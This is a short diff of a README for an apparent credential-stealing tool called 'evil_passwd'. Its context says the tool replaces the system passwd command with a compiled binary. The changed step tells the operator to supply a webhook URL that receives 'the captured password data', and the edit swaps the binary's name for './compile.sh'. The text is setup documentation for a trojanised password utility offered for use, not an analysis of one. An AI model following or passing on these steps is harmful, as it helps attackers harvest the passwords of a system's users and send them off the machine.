@@ -57,7 +57,7 @@ This step will replace the system’s `passwd` command with your newly compiled 
 
 ### 5. Configure the Webhook URL
 
-During the execution of the `evil_passwd` binary, you will be prompted to enter a webhook URL. This URL is where the captured password data will be sent. Make sure the URL is correct and configured to receive the webhook data.
+During the execution of the `./compile.sh` binary, you will be prompted to enter a webhook URL. This URL is where the captured password data will be sent. Make sure the URL is correct and configured to receive the webhook data.
 
 ## Usage
 
